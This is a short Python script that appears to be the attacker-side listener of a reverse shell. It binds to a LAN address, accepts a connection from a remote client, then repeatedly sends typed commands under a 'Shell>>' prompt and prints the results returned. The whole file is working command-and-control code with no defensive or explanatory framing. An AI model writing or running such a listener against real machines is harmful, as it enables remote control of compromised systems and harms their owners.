import socket

server_ip = "192.168.0.105"
server_port = 12345
buffer = 1024 * 128

s = socket.socket()
s.bind((server_ip, server_port))
s.listen(1)
print("{} on port {} is listen ...".format(server_ip,server_port))
client_socket, client_address = s.accept()
print("{} is connected".format(client_address))

cwd = client_socket.recv(buffer).decode()
print("[+] Current working directory:", cwd)
while True:
    command = input("Shell>> ".format(cwd))
    if not command:#.strip():
        continue
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    output = client_socket.recv(buffer).decode()
    results = output
    print(results)